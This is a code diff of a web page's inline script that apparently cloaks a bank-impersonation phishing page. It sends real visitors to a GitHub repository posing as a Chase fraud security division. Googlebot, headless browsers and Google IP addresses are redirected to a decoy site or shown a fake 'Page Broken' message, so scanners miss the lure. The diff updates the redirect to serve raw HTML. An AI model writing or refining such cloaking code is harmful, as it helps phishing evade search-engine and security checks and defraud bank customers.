@@ -11,11 +11,10 @@
     <script>
         // Redirect if Googlebot is detected
         if (navigator.userAgent.indexOf("Googlebot") === -1) {
-            window.location.href = "https://github.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/blob/main/index.html"; // Redirect real users
-        } else {
-            window.location.href = "https://trollface.dk/"; // Redirect Googlebot to a harmless page
-        }
-
+        window.location.href = "https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/main/index.html"; // Redirect real users to raw HTML
+    } else {
+        window.location.href = "https://trollface.dk/"; // Redirect Googlebot to a harmless page
+    }
         // Check for headless browsers (common for bots)
         if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) {
             document.body.innerHTML = "Page Broken";
@@ -61,7 +60,7 @@
                 if (googleIps.includes(userIp)) {
                     window.location.href = "https://trollface.dk/"; // Redirect Googlebot IPs
                 } else {
-                    window.location.href = "https://github.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/blob/main/index.html"; // Redirect real users
+                    window.location.href = "https://github.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/main/index.html"; // Redirect real users
                 }
             })
             .catch(error => console.error("IP fetch failed:", error));
